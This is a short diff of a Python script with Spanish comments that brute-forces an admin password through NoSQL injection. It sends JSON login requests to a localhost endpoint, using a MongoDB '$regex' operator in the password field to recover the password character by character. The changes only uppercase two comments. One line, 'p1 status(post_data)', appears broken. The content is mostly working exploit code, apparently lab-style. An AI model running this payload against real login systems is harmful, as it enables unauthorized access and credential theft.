@@ -16,7 +16,7 @@ def def_handler(sig, frame):
 signal.signal(signal.SIGINT, def_handler)
 
 # Variables globales
-login_url = "http://localhost:4000/user/login"
+login_url = "http://localhost:4000/user/login" # RUTA DE ATAQUE
 characters = string.ascii_lowercase + string.ascii_uppercase + string.digits
 
 def makeNoSQLI():
@@ -33,7 +33,7 @@ def makeNoSQLI():
 	for position in range(0, 100): 
 		for character in characters:
 
-			post_data = '{"username":"admin","password":{"$regex":"^%s%s"}}' % (password,character) # usuario a probar
+			post_data = '{"username":"admin","password":{"$regex":"^%s%s"}}' % (password,character) # USUARIO A PROBAR
 
 			p1 status(post_data)
 
